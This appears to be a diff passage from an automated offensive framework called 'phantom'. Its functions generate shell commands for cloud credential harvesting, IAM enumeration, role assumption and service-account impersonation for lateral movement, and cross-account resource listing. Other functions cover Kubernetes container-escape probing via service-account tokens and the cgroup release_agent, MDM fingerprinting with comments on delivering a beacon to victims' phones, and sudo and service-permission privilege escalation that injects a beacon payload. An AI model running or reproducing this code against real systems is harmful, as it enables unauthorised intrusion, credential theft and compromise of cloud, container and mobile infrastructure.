+                   "evidence": out[:400]},
+            confidence=0.8, source="cloud_creds_harvest", target=wm.target))
+    elif "__CLOUD_AZURE__" in out:
+        provider = "azure"
+        findings.append(Finding(
+            kind="cloud_creds", key="identity_azure",
+            value={"provider": "azure", "via": "metadata",
+                   "evidence": out[:400]},
+            confidence=0.8, source="cloud_creds_harvest", target=wm.target))
+    if provider:
+        findings.append(Finding(
+            kind="cloud_creds", key="provider",
+            value={"provider": provider, "from": "beacon"},
+            confidence=0.9, source="cloud_creds_harvest", target=wm.target))
+    return findings
+
+
+def _cloud_s3_adapter(wm, slots):
+    """Enumerate cloud object storage with harvested IAM creds: AWS whoami
+    + bucket listing. Provider selection is read from the finding."""
+    provider = (slots.get("provider") or "aws").lower()
+    if provider == "aws":
+        return ("aws sts get-caller-identity 2>/dev/null; "
+                "aws s3 ls 2>/dev/null && echo __CLOUD_S3_OK__ || "
+                "echo __CLOUD_S3_NONE__")
+    if provider == "gcp":
+        return ("gcloud auth list 2>/dev/null; "
+                "gsutil ls 2>/dev/null && echo __CLOUD_S3_OK__ || "
+                "echo __CLOUD_S3_NONE__")
+    return ("echo __CLOUD_S3_NONE__ && echo 'provider not supported for "
+            f"s3 enum: {provider}'")
+
+
+# ---------------------------------------------------------------------------
+# cloud lateral movement (IAM roles -> STS -> cross-account) — planner-grade
+# ---------------------------------------------------------------------------
+
+def _cloud_provider(wm, slots=None):
+    """Resolve the cloud provider for the current foothold: the explicit
+    slot wins, then the `cloud_creds` finding, then the environment fact.
+    Defaults to aws (the most common instance-role case)."""
+    prov = str((slots or {}).get("provider") or "").strip().lower()
+    if prov in ("aws", "gcp", "azure"):
+        return prov
+    try:
+        for f in wm.find("cloud_creds"):
+            v = f.value if isinstance(f.value, dict) else {}
+            p = str(v.get("provider") or "").lower()
+            if p in ("aws", "gcp", "azure"):
+                return p
+        for f in wm.find("environment"):
+            v = f.value if isinstance(f.value, dict) else {}
+            p = str(v.get("cloud") or "").lower()
+            for name in ("aws", "gcp", "azure"):
+                if name in p:
+                    return name
+    except Exception:
+        pass
+    return "aws"
+
+
+def _cloud_assumable_identity(wm, provider=None):
+    """The identity `cloud_assume_role` should assume, taken from the
+    `cloud_lateral:roles` finding produced by `cloud_iam_enum`.
+
+    Returns the first identity (role ARN / service-account email / role
+    principal) matching the resolved provider, so the chain
+    iam_enum -> assume_role -> cross_account runs without manual input.
+    """
+    prov = (provider or _cloud_provider(wm)).lower()
+    for f in wm.find("cloud_lateral"):
+        v = f.value if isinstance(f.value, dict) else {}
+        for ident in (v.get("role_arns") or []):
+            ident = str(ident).strip()
+            if not ident:
+                continue
+            if prov == "aws":
+                if ident.startswith("arn:aws:iam:"):
+                    return ident
+            else:
+                # gcp: service-account email; azure: role/principal name
+                if "@" in ident or prov == "azure":
+                    return ident
+    return ""
+
+
+def _cloud_iam_enum_adapter(wm, slots):
+    """With harvested creds: enumerate the identity plane READ-ONLY and
+    discover the lateral movement surface (assumable roles / service
+    accounts / role assignments). Provider-aware: aws, gcp, azure.
+
+    Read-only API calls only — no privilege change happens here.
+    """
+    prov = _cloud_provider(wm, slots)
+    if prov == "gcp":
+        return (
+            "echo __IAM_START__; "
+            "P=$(gcloud config get-value project 2>/dev/null); echo account=$P; "
+            "gcloud iam service-accounts list --format='value(email)' "
+            "2>/dev/null | head -15; "
+            "gcloud projects get-iam-policy $P --format='value(bindings.role)' "
+            "2>/dev/null | head -15; "
+            "echo; echo __IAM_END__"
+        )
+    if prov == "azure":
+        return (
+            "echo __IAM_START__; "
+            "A=$(az account show --query id -o tsv 2>/dev/null); echo account=$A; "
+            "az role definition list --query '[].name' -o tsv 2>/dev/null "
+            "| head -15; "
+            "az role assignment list --all --query '[].roleDefinitionName' "
+            "-o tsv 2>/dev/null | head -10; "
+            "echo; echo __IAM_END__"
+        )
+    return (
+        "echo __IAM_START__; "
+        "A=$(aws sts get-caller-identity --query Account --output text 2>/dev/null); "
+        "echo account=$A; "
+        "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output text 2>/dev/null "
+        "| head -15; "
+        "aws iam get-account-summary --output json 2>/dev/null | head -c 400; "
+        "echo; echo __IAM_END__"
+    )
+
+
+def _cloud_iam_enum_interp(output, wm, slots):
+    """Parse identity-plane enumeration into cloud_access + cloud_lateral.
+
+    The assumable identities are collected in a PROVIDER-NEUTRAL list so
+    the chain works for aws (role ARNs), gcp (service-account emails) and
+    azure (role / principal names). The first entry is what
+    `cloud_assume_role` will be autofilled with.
+    """
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "__IAM_START__" not in out:
+        return []
+    findings = []
+    roles = []
+    account = ""
+    provider = _cloud_provider(wm, slots)
+    for ln in out.splitlines():
+        ln = ln.strip()
+        if ln.startswith("account="):
+            account = ln.split("=", 1)[1]
+        elif "arn:aws:iam::" in ln and ":role/" in ln:
+            # 'RoleName\tarn:aws:iam::ACCOUNT:role/NAME' or a bare ARN line
+            part = ln.split("\t")[-1].strip()
+            if part.startswith("arn:aws:iam::"):
+                roles.append(part)
+            else:
+                # whole line IS the ARN (no tab in output)
+                import re as _re
+                m = _re.search(r"arn:aws:iam::\d+:role/\S+", ln)
+                if m:
+                    roles.append(m.group(0))
+        elif provider == "gcp" and "@" in ln and "." in ln and " " not in ln:
+            # service-account email (foo@project.iam.gserviceaccount.com)
+            roles.append(ln)
+        elif provider == "azure" and ln and "=" not in ln \
+                and not ln.startswith("{"):
+            # role definition / assignment name
+            if len(ln) > 2 and " " not in ln:
+                roles.append(ln)
+    # de-duplicate, preserve order
+    seen = set()
+    roles = [r for r in roles if not (r in seen or seen.add(r))]
+    if account:
+        findings.append(Finding(
+            kind="cloud_access", key="account",
+            value={"account_id": account, "via": "iam_enum",
+                   "provider": provider},
+            confidence=0.9, source="cloud_iam_enum", target=wm.target))
+    if roles:
+        findings.append(Finding(
+            kind="cloud_lateral", key="roles",
+            value={"role_arns": roles[:15], "count": len(roles),
+                   "account_id": account, "provider": provider},
+            confidence=0.85, source="cloud_iam_enum", target=wm.target))
+    return findings
+
+
+def _cloud_assume_role_adapter(wm, slots):
+    """Assume / impersonate a discovered identity and verify the NEW
+    identity. This is the cloud lateral-movement primitive; provider-aware:
+
+      * aws   -> sts assume-role (temporary credential set)
+      * gcp   -> service-account impersonation (`--impersonate-service-account`)
+      * azure -> managed identity / federated token check
+    """
+    role_arn = str(slots.get("role_arn") or "").strip()
+    if not role_arn:
+        return "echo __ASSUME_DENIED__"
+    prov = _cloud_provider(wm, slots)
+    if prov not in ("aws", "gcp", "azure"):
+        # non-AWS identifiers (an email/SA address) imply gcp
+        prov = "gcp" if "@" in role_arn else prov
+    if not role_arn.startswith("arn:aws:iam:") and prov == "aws":
+        prov = "gcp" if "@" in role_arn else prov
+
+    if prov == "gcp":
+        return (
+            "echo __ASSUME_START__; "
+            f"TOKEN=$(gcloud auth print-access-token "
+            f"--impersonate-service-account={role_arn} 2>/dev/null); "
+            "if [ -n \"$TOKEN\" ]; then "
+            f"gcloud auth list --filter=status:ACTIVE --format='value(account)' "
+            "2>/dev/null | head -2; echo __ASSUME_OK__; "
+            "else echo __ASSUME_DENIED__; fi"
+        )
+    if prov == "azure":
+        return (
+            "echo __ASSUME_START__; "
+            "T=$(az account get-access-token --query accessToken -o tsv 2>/dev/null); "
+            "if [ -n \"$T\" ]; then "
+            "az account show --query '[user.name,tenantId]' -o tsv 2>/dev/null; "
+            "echo __ASSUME_OK__; else echo __ASSUME_DENIED__; fi"
+        )
+    if not role_arn.startswith("arn:aws:iam:"):
+        return "echo __ASSUME_DENIED__"
+    return (
+        "echo __ASSUME_START__; "
+        f"C=$(aws sts assume-role --role-arn {role_arn} --role-session-name phantom-lateral "
+        "--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text 2>/dev/null); "
+        "if [ -n \"$C\" ]; then "
+        "set -- $C; "
+        "AWS_ACCESS_KEY_ID=$1 AWS_SECRET_ACCESS_KEY=$2 AWS_SESSION_TOKEN=$3 "
+        "aws sts get-caller-identity --output text 2>/dev/null | head -2; "
+        "echo __ASSUME_OK__; else echo __ASSUME_DENIED__; fi"
+    )
+
+
+def _cloud_assume_role_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "__ASSUME_OK__" in out:
+        return [Finding(
+            kind="cloud_lateral", key="assumed",
+            value={"role_arn": slots.get("role_arn", ""),
+                   "evidence": out[:400], "status": "assumed"},
+            confidence=0.95, source="cloud_assume_role", target=wm.target)]
+    if "__ASSUME_DENIED__" in out:
+        return [Finding(
+            kind="cloud_lateral", key="denied",
+            value={"role_arn": slots.get("role_arn", ""), "status": "denied"},
+            confidence=0.6, source="cloud_assume_role", target=wm.target)]
+    return []
+
+
+def _cloud_cross_account_adapter(wm, slots):
+    """With an assumed identity: enumerate cross-account / cross-project
+    visibility READ-ONLY (storage, org structure, compute inventory).
+    Provider-aware: aws / gcp / azure."""
+    prov = _cloud_provider(wm, slots)
+    if prov == "gcp":
+        return (
+            "echo __XACCT_START__; "
+            "gcloud storage buckets list --format='value(name)' 2>/dev/null "
+            "| head -10; "
+            "gcloud projects list --format='value(projectId)' 2>/dev/null "
+            "| head -10; "
+            "gcloud functions list --format='value(name)' 2>/dev/null | head -5; "
+            "echo __XACCT_END__"
+        )
+    if prov == "azure":
+        return (
+            "echo __XACCT_START__; "
+            "az storage account list --query '[].name' -o tsv 2>/dev/null "
+            "| head -10; "
+            "az account list --query '[].name' -o tsv 2>/dev/null | head -10; "
+            "az functionapp list --query '[].name' -o tsv 2>/dev/null | head -5; "
+            "echo __XACCT_END__"
+        )
+    return (
+        "echo __XACCT_START__; "
+        "aws s3 ls 2>/dev/null | head -10; "
+        "aws organizations list-accounts --query 'Accounts[*].[Id,Name]' --output text 2>/dev/null | head -10; "
+        "aws lambda list-functions --query 'Functions[*].FunctionName' --output text 2>/dev/null | head -5; "
+        "echo __XACCT_END__"
+    )
+
+
+def _cloud_cross_account_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "__XACCT_START__" not in out:
+        return []
+    findings = []
+    provider = _cloud_provider(wm, slots)
+    body = out.split("__XACCT_START__")[-1].split("__XACCT_END__")[0]
+    if provider == "aws":
+        buckets = [ln.split()[2] if len(ln.split()) > 2 else ln.strip()
+                   for ln in body.splitlines() if ln.strip().startswith("20")]
+    else:
+        # gcp/azure list a bare resource name per line
+        buckets = [ln.strip() for ln in body.splitlines()
+                   if ln.strip() and not ln.strip().startswith(("#", "{"))]
+    if buckets:
+        findings.append(Finding(
+            kind="cloud_access", key="cross_account_buckets",
+            value={"buckets": buckets[:10], "via": "assumed_role"},
+            confidence=0.85, source="cloud_cross_account", target=wm.target))
+    if "arn:aws:organizations" in body or any(l.strip() and not l.strip().startswith(("20", "#")) for l in body.splitlines()):
+        findings.append(Finding(
+            kind="cloud_lateral", key="cross_account_recon",
+            value={"detail": body[:400], "via": "assumed_role"},
+            confidence=0.7, source="cloud_cross_account", target=wm.target))
+    return findings
+
+
+def _cloud_s3_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    ok = "__CLOUD_S3_OK__" in out
+    if "GetCallerIdentity" in out and "arn:" in out:
+        return [Finding(kind="cloud_access", key="iam_valid",
+                        value={"arn": out.split("arn:")[-1].split()[0].split("\"")[0],
+                               "evidence": out[:400]},
+                        confidence=0.95, source="cloud_s3_enum",
+                        target=wm.target)]
+    if ok:
+        return [Finding(kind="cloud_access", key="s3",
+                        value={"bucket_list": out[:500], "ok": True},
+                        confidence=0.9, source="cloud_s3_enum", target=wm.target)]
+    return []
+
+
+# ---------------------------------------------------------------------------
+# mobile / device-management surface
+# ---------------------------------------------------------------------------
+
+#: Ports whose mobile/MDM surface is served over TLS. Every real MDM
+#: (Jamf, Intune, SimpleMDM) terminates TLS on 443/8443, and so does the
+#: phone lab; the probe used to hardcode http:// and drop the target's port,
+#: so it could not see the very surface it exists to find (measured
+#: 2026-11-08 against 127.0.0.1:8443: zero findings).
+_MOBILE_TLS_PORTS = frozenset({"443", "8443", "9443", "10443"})
+#: Ports that are expected to answer plain HTTP.
+_MOBILE_HTTP_PORTS = frozenset({"80", "8080", "8081", "8000", "8888"})
+
+
+def _mobile_base_urls(wm, slots=None):
+    """Candidate absolute base URLs for a mobile/MDM surface, TLS-aware.
+
+    The target's OWN port wins (a service target such as
+    ``127.0.0.1:8443`` must not be probed on 80), scanned services add the
+    ports the scan actually saw, and an unscanned host falls back to the two
+    defaults that matter (443 then 80). TLS is chosen by port, never assumed
+    from the presence of a certificate: an MDM on 8080 is still HTTP.
+
+    Bounded to four URLs: every probe here runs against the target, and an
+    unbounded port list would turn a bounded recon step into a scan.
+    """
+    override = str((slots or {}).get("base_url") or "").strip().rstrip("/")
+    if override:
+        if "://" in override:
+            return [override]
+        _, own = split_host_port(override)
+        scheme = "https" if str(own or "") in _MOBILE_TLS_PORTS else "http"
+        return [f"{scheme}://{override}"]
+
+    host = _effective_target(wm)
+    _, own = split_host_port(str(getattr(wm, "target", "") or ""))
+    ports = [str(own)] if own else []
+    try:
+        for finding in wm.find("service"):
+            value = finding.value if isinstance(finding.value, dict) else {}
+            port = str(value.get("port", "") or "")
+            if port in _MOBILE_TLS_PORTS or port in _MOBILE_HTTP_PORTS:
+                ports.append(port)
+    except Exception:
+        pass
+    if not ports:
+        # TLS first: an MDM is almost never plain HTTP.
+        ports = ["443", "80"]
+    out = []
+    for port in ports:
+        scheme = "https" if port in _MOBILE_TLS_PORTS else "http"
+        url = f"{scheme}://{_hport(host, port)}"
+        if url not in out:
+            out.append(url)
+    return out[:4]
+
+
+def _mobile_probe_adapter(wm, slots):
+    """Probe for mobile or device-management infrastructure: MDM endpoints,
+    push gateways (APNS/GCM), and mobile-web user agents."""
+    ua = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
+          "AppleWebKit/605.1.15")
+    # cmd.exe has no /dev/null, single quotes are literal, and `grep` is not
+    # guaranteed on PATH: the probe must run on the OPERATOR's shell too.
+    null = "NUL" if os.name == "nt" else "/dev/null"
+    err = "2>NUL" if os.name == "nt" else "2>/dev/null"
+    cmds = []
+    for base in _mobile_base_urls(wm, slots):
+        for ep in ("/api/v2/mdm", "/enroll", "/api/device", "/config/mobile",
+                   "/v1/push", "/push", "/apns", "/gcm", "/fcm"):
+            # The trailing `;` is the RECORD separator the interpreter
+            # splits on; without it Windows' `&` join concatenated every code
+            # into one unparseable line (measured 2026-11-08).
+            cmds.append(f'curl -m 2 -sk -A "{ua}" {base}{ep} -o {null} '
+                        f'-w "%{{http_code}}:{ep};" {err}')
+        cmds.append(f'curl -m 2 -sk -A "{ua}" {base}/ -o {null} '
+                    f'-w "%{{http_code}}:home-mobile;" {err}')
+    return _join_local_shell(cmds)
+
+
+def _mobile_probe_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    # adapter emits '<http_code>:<path>' (curl -w '%{http_code}:...') —
+    # the code comes BEFORE the colon, so match '200:'/'301:'/'302:'
+    hits = [ln for ln in out.split(";")
+            if any(ln.startswith(f"{code}:")
+                   for code in ("200", "301", "302"))]
+    labels = []
+    for ln in hits:
+        ep = ln.split(":", 1)[-1].strip()
+        for m in ("mdm", "enroll", "device", "mobile", "push", "apns",
+                  "gcm", "fcm"):
+            if m in ep.lower():
+                labels.append(ep)
+    if "__MOBILE_WEB__" in out or labels:
+        return [Finding(kind="mobile", key="surface",
+                        value={"endpoints": labels or ["home-mobile"],
+                               "detail": "mobile/device-management surface"},
+                        confidence=0.7, source="mobile_probe", target=wm.target)]
+    return []
+
+
+# ---------------------------------------------------------------------------
+# MDM vendor fingerprinting (active mobile recon)
+# ---------------------------------------------------------------------------
+
+_MDM_SIGNATURES = {
+    "jamf": ["jamf", "/casper/", "/computers", "JamfPro"],
+    "intune": ["intune", "manage.microsoft.com", "Endpoint Management"],
+    "mobileiron": ["mobileiron", "/mifs/", "Ivanti"],
+    "airwatch": ["airwatch", "awcm", "Workspace ONE", "workspaceone"],
+    "kandji": ["kandji", "/api/v1/prism"],
+    "simplemdm": ["simplemdm", "/api/v1/devices"],
+}
+
+
+def _mdm_fingerprint_adapter(wm, slots):
+    """Vendor-class an MDM endpoint: probe the enrollment + API surface
+    with MDM user-agents and grep vendor signatures. Read-only.
+
+    Probes with BOTH an iOS and an Android MDM user-agent because many
+    enrolment endpoints are platform-gated: the UA that gets a 200 (or a
+    vendor-specific body) tells us which mobile branch the auto-mode must
+    take. Server-side platform signals are the only non-intrusive way to
+    learn the platform before any victim contact.
+    """
+    ua_ios = "MDM/1.0 (Macintosh; Mac OS X)"
+    ua_android = ("MDM/1.0 (Linux; Android 14; Pixel 8) "
+                  "Android-MDM-Agent/1.0")
+    import tempfile
+
+    # Explicit commands, not a POSIX `for` loop: the adapter runs on the
+    # OPERATOR's shell, and cmd.exe cannot parse `for ... do ... done` at all
+    # (measured 2026-11-08: the loop produced zero MDM lines on Windows). One
+    # bounded request per (base, path, platform), each labelled before its
+    # body so the interpreter never has to correlate separate streams.
+    tmp = os.path.join(tempfile.gettempdir(), f"_phantom_mdm_{os.getpid()}.txt")
+    body = f'type "{tmp}"' if os.name == "nt" else f'cat "{tmp}"'
+    newline = "echo." if os.name == "nt" else "echo"
+    err = "2>NUL" if os.name == "nt" else "2>/dev/null"
+    segments = ["echo __MDM_START__"]
+    for base in _mobile_base_urls(wm, slots)[:3]:
+        for path in ("/", "/enroll", "/mypolicies", "/api/v1", "/api/mdm",
+                     "/BYOD", "/discovery"):
+            for plat, ua in (("ios", ua_ios), ("android", ua_android)):
+                segments.append(
+                    f'curl -m 2 -sk -A "{ua}" -o "{tmp}" '
+                    f'-w "PLAT:{plat}:PATH:{path}:CODE:%{{http_code}}" '
+                    f'"{base}{path}" {err}')
+                segments.append(newline)
+                segments.append(body)
+                segments.append(newline)
+    segments.append("echo __MDM_END__")
+    return _join_local_shell(segments)
+
+
+def _mdm_fingerprint_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "__MDM_START__" not in out:
+        return []
+    body = out.split("__MDM_START__")[-1].split("__MDM_END__")[0].lower()
+    findings = []
+    vendors = []
+    for vendor, sigs in _MDM_SIGNATURES.items():
+        if any(s.lower() in body for s in sigs):
+            vendors.append(vendor)
+    open_paths = []
+    # platform reachability: which UA got a serving response per path
+    by_platform = {"ios": [], "android": []}
+    for ln in body.splitlines():
+        if ln.startswith("plat:") and ":code:" in ln:
+            parts = ln.split("plat:", 1)[1]
+            ptag = parts.split(":path:", 1)[0]
+            path = parts.split(":path:", 1)[1].split(":code:")[0]
+            code = parts.split(":code:")[-1].strip()
+            if code.startswith("2"):
+                if ptag in by_platform:
+                    by_platform[ptag].append(path)
+                if ptag == "ios":
+                    open_paths.append(path)
+        elif ln.startswith("path:") and ":code:200" in ln:
+            # legacy single-UA output (back-compat)
+            open_paths.append(ln.split("path:")[1].split(":code:")[0])
+    if vendors or open_paths or any(by_platform.values()):
+        platforms = [p for p, paths in by_platform.items() if paths]
+        findings.append(Finding(
+            kind="mdm_vendor", key="fingerprint",
+            value={"vendors": vendors, "open_paths": open_paths[:8],
+                   "platforms": platforms,
+                   "auth_hint": ("saml" if "saml" in body else
+                                 "entra" if ("entra" in body or "login.microsoft" in body)
+                                 else "unknown")},
+            confidence=0.8 if vendors else 0.55,
+            source="mobile_mdm_fingerprint", target=wm.target))
+        # the platform decides the delivery branch: Android sideloads the
+        # NDK beacon, iOS needs MDM supervision + an enterprise-signed app
+        if platforms:
+            findings.append(Finding(
+                kind="mobile_platform", key="mdm",
+                value={"platforms": platforms,
+                       "mdm": bool(vendors),
+                       "vendor": vendors[0] if vendors else ""},
+                confidence=0.7, source="mobile_mdm_fingerprint",
+                target=wm.target))
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# kubernetes escape surface
+# ---------------------------------------------------------------------------
+
+def _has_k8s():
+    """True when the box (or its env probe) indicates a running Kubernetes
+    pod: K8s service-account, pod token, or an environment flag."""
+    def _requires_k8s(wm: WorldModel) -> bool:
+        for f in wm.find("environment"):
+            v = f.value if isinstance(f.value, dict) else {}
+            kinds = v.get("kinds") or []
+            labels = [str(k.get("kind", "")) for k in kinds] if kinds else []
+            if "kubernetes" in labels:
+                return True
+        for f in wm.find("container_info"):
+            return True
+        return False
+    return _requires_k8s
+
+
+def _k8s_escape_adapter(wm, slots):
+    """Probe a compromised container for Kubernetes escape primitives:
+    mounted service-account token (capable list call), privileged pod via
+    /dev (cgroup -rw escape), and reachable kubelet node/metrics API.
+    Non-destructive: reports the primitive without executing it."""
+    return (
+        "echo __K8S_START__; "
+        # 1) service-account token present -> list cluster objects with it
+        "test -r /var/run/secrets/kubernetes.io/serviceaccount/token "
+        "&& echo __K8S_SA_TOKEN__ && "
+        "K=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); "
+        "test -n \"$K\" && curl -m 3 -sk -H \"Authorization: Bearer $K\" "
+        "https://kubernetes.default.svc/api/v1/namespaces/default/pods "
+        "2>/dev/null | head -c 200 && echo __K8S_SA_ADMIN__ || echo __K8S_SA_RO__; "
+        # 2) privileged pod: writable cgroup release_agent (classic escape)
+        "test -w /sys/fs/cgroup/release_agent && echo __K8S_PRIV_CGROUP__; "
+        "test -f /dev/kmsg && echo __K8S_DEV_HOST__; "
+        # 3) kubelet reachable (read-only node access)
+        "curl -m 2 -sk https://$(hostname):10250/pods 2>/dev/null "
+        "| head -c 100 && echo __K8S_KUBELET__; "
+        "echo __K8S_END__"
+    )
+
+
+def _k8s_escape_interp(output, wm, slots):
+    from phantom.automation.belief import Finding
+    out = output or ""
+    primitives = []
+    if "__K8S_SA_ADMIN__" in out:
+        primitives.append("sa-list-cluster")
+    elif "__K8S_SA_TOKEN__" in out:
+        primitives.append("sa-token")
+    if "__K8S_PRIV_CGROUP__" in out:
+        primitives.append("privileged-cgroup")
+    if "__K8S_DEV_HOST__" in out:
+        primitives.append("dev-host")
+    if "__K8S_KUBELET__" in out:
+        primitives.append("kubelet")
+    if not primitives:
+        return []
+    return [Finding(kind="k8s_escape", key="->".join(primitives),
+                    value={"primitives": primitives, "output": out[:600]},
+                    confidence=0.85, source="k8s_escape", target=wm.target)]
+
+
+def _idor_adapter(wm, slots):
+    """Marker stub: the IDOR engine executes in-process (baseline +
+    differential reference walk), never through the shell — the adapter
+    keeps the 'adapter is the only command source' invariant."""
+    return "idor://web (differential engine, in-process)"
+
+
+def _origin_adapter(wm, slots):
+    """Marker stub: origin discovery executes in-process (CT logs, DNS
+    resolution, header evidence) and NEVER sends a packet at the edge —
+    the adapter exists only to keep the 'adapter is the command source'
+    invariant, like the IDOR and web-credentials engines."""
+    return "edge://origin-discovery (in-process)"
+
+
+def _external_intel_adapter(wm, slots):
+    """Marker stub: external intel executes in-process (Shodan/crt.sh/BGP
+    HTTP lookups) and sends NO packet at the target. The adapter exists
+    only to keep the 'adapter is the command source' invariant."""
+    return "ext://external-recon (in-process)"
+
+
+def _phone_intel_adapter(wm, slots):
+    """Marker stub: phone intel executes in-process against the offline
+    ``phonenumbers`` metadata database and sends NOTHING at the target (it
+    is not even a network capability). The adapter exists only to keep the
+    'adapter is the command source' invariant, like external_recon."""
+    return "phone://metadata (in-process, offline)"
+
+
+def _idor_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Parse IDOR: markers into idor findings (authorization flaws)."""
+    from phantom.automation.belief import Finding
+    findings = []
+    for line in (output or "").splitlines():
+        if not line.startswith("IDOR:"):
+            continue
+        kv = {}
+        for chunk in line[len("IDOR:"):].split():
+            if "=" in chunk:
+                k, v = chunk.split("=", 1)
+                kv[k.strip()] = v.strip()
+        param = kv.get("param")
+        if not param:
+            continue
+        try:
+            score = float(kv.get("score") or 0)
+        except (TypeError, ValueError):
+            score = 0.0
+        findings.append(Finding(
+            kind="idor", key=f"{param}:{kv.get('endpoint', '/')}",
+            value={"param": param, "endpoint": kv.get("endpoint", ""),
+                   "size_delta": kv.get("size", ""),
+                   "distinct": kv.get("distinct", ""),
+                   "score": score,
+                   "confirmed": kv.get("confirmed", "") == "true",
+                   "severity": kv.get("severity", "medium"),
+                   "evidence": kv.get("evidence", "")[:200]},
+            confidence=min(0.9, 0.5 + score * 0.4),
+            source="idor_scan", target=wm.target))
+    return findings
+
+
+def _hunt_web_adapter(wm, slots):
+    """Marker stub: the hunt capability executes through the anomaly
+    engine channel (in-process), never through the shell — this adapter
+    exists to keep the 'adapter is the only command source' invariant."""
+    return "hunt://web (anomaly engine, in-process)"
+
+
+def _hunt_web_interp(output, wm, slots):
+    """Parse HUNT: markers into hunt_anomaly findings (behavioural
+    bug-class candidates produced by the anomaly engine)."""
+    from phantom.automation.belief import Finding
+    findings = []
+    for line in (output or "").splitlines():
+        if not line.startswith("HUNT:"):
+            continue
+        kv = {}
+        for chunk in line[len("HUNT:"):].split():
+            if "=" in chunk:
+                k, v = chunk.split("=", 1)
+                kv[k.strip()] = v.strip()
+        cls = kv.get("cls")
+        if not cls:
+            continue
+        key = f"{cls}:{kv.get('port', '?')}:{kv.get('name', 'probe')}"
+        findings.append(Finding(
+            kind="hunt_anomaly", key=key,
+            value={"cls": cls, "name": kv.get("name", ""),
+                   "endpoint": kv.get("endpoint", ""),
+                   "signals": kv.get("signals", ""),
+                   "score": kv.get("score", ""),
+                   "confirmed": kv.get("confirmed", "") == "true",
+                   "severity": kv.get("severity", "medium"),
+                   "port": kv.get("port", ""),
+                   "evidence": kv.get("evidence", "")[:300]},
+            confidence=0.6, source="hunt_web", target=wm.target))
+    return findings
+
+
+def _sudo_adapter(wm, slots):
+    from phantom.automation.post.privesc import sudo_escalation_command
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    payload = slots.get("payload") or _beacon_payload(wm)
+    if not pw:
+        raise ValueError("sudo escalation requires the password of the current session")
+    return sudo_escalation_command(user, pw, payload)
+
+
+def _service_perms_adapter(wm, slots):
+    from phantom.automation.post.privesc import service_perms_escalation_command
+    payload = slots.get("payload") or _beacon_payload(wm)
+    return service_perms_escalation_command(payload)
+
+
+def _beacon_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    if "callback" in (slots or {}):
+        return [Finding(kind="beacon", key="established", value={"callback": slots["callback"]},
+                        confidence=0.9, source="adapter", target=wm.target)]
+    return []
+
+
+# ── deep protocol fingerprinting ──────────────────────────────────────
+
+def _fingerprint_adapter(wm: WorldModel, slots: Dict[str, Any]) -> str:
+    """Adapter: run the deep fingerprint engine against all discovered services."""
+    from phantom.automation.fingerprint.probes import FingerprintEngine
+    services = wm.find("service")
+    if not services:
+        return "# no services to fingerprint"
+    host = _effective_target(wm)
+    engine = FingerprintEngine(timeout=5.0)
+    ports = []
+    for f in services:
+        try:
+            port = int(str(f.key).split("/")[-1]) if "/" in str(f.key) else int(f.key)
+        except (ValueError, TypeError):
+            continue
+        ports.append(port)
+    if not ports:
+        return "# no ports to fingerprint"
+    results = engine.probe_all(host, ports)
+    # Write findings into world model
+    engine.to_worldmodel(wm, host)
+    # Return a summary line the perception layer can parse
+    if results:
+        lines = [f"FINGERPRINT:{r.port}:{r.service}:{r.product or '?'}:{r.version or '?'}"
+                 for r in results if r.ok]
+        return "\n".join(lines)
+    return "# fingerprint produced no results"
+
+
+def _fingerprint_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: parse fingerprint result lines into findings."""
+    findings = []
+    for line in output.split("\n"):
+        line = line.strip()
+        if not line.startswith("FINGERPRINT:"):
+            continue
+        parts = line.split(":", 4)  # FINGERPRINT:port:service:product:version
+        if len(parts) >= 5:
+            port = parts[1]
+            service = parts[2]
+            product = parts[3] if parts[3] != "?" else ""
+            version = parts[4] if parts[4] != "?" else ""
+            findings.append(Finding(
+                kind="fingerprint", key=f"{service}/{port}",
+                value={"port": port, "service": service, "product": product, "version": version},
+                confidence=0.85 if version else 0.7,
+                source="fingerprint_probe", target=wm.target))
+    return findings
+
+
+# ── differential analysis adapter ─────────────────────────────────────
+
+def _differential_adapter(wm: WorldModel, slots: Dict[str, Any]) -> str:
+    """Adapter: run the differential analysis engine on all services."""
+    from phantom.automation.exploit.differential import run_differential_analysis
+    host = _effective_target(wm)
+    findings = run_differential_analysis(wm, host, timeout=5.0)
+    if findings:
+        lines = [f"DIFF:{a.host}:{a.port}:{a.service}:{a.cls}:{a.severity}:{a.score:.2f}"
+                 for a in findings]
+        return "\n".join(lines)
+    return "# differential analysis produced no confirmed anomalies"
+
+
+def _differential_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: parse differential findings into the world model."""
+    findings = []
+    for line in output.split("\n"):
+        line = line.strip()
+        if not line.startswith("DIFF:"):
+            continue
+        parts = line.split(":", 5)
+        if len(parts) >= 6:
+            host, port, service, cls, severity, score = parts[1:7]
+            findings.append(Finding(
+                kind="differential_anomaly", key=f"{service}/{port}/{cls}",
+                value={"host": host, "port": port, "service": service,
+                       "cls": cls, "severity": severity, "score": score},
+                confidence=0.85 if severity in ("critical", "high") else 0.6,
+                source="differential_analysis", target=host))
+    return findings
+
+
+def recon_ladder_capability():
+    """The bounded escalation rung, built ON DEMAND.
+
+    It is deliberately NOT in ``CAPABILITIES``: the planner would otherwise
+    treat a full-range sweep as just another recon move and could pick it
+    as the FIRST action (or an e2e test could execute it by accident). The
+    agent escalates to it explicitly, once, after top-ports found no
+    remote-access service.
+    """
+    return _mk("recon_ladder", "recon",
+               "Bounded escalation: preflight reachability, chunked "
+               "full-range TCP (8k slices, each with its own timeout), UDP "
+               "top ports, then a typed surface verdict with the "
+               "network→identity pivot. Stops early when the host drops two "
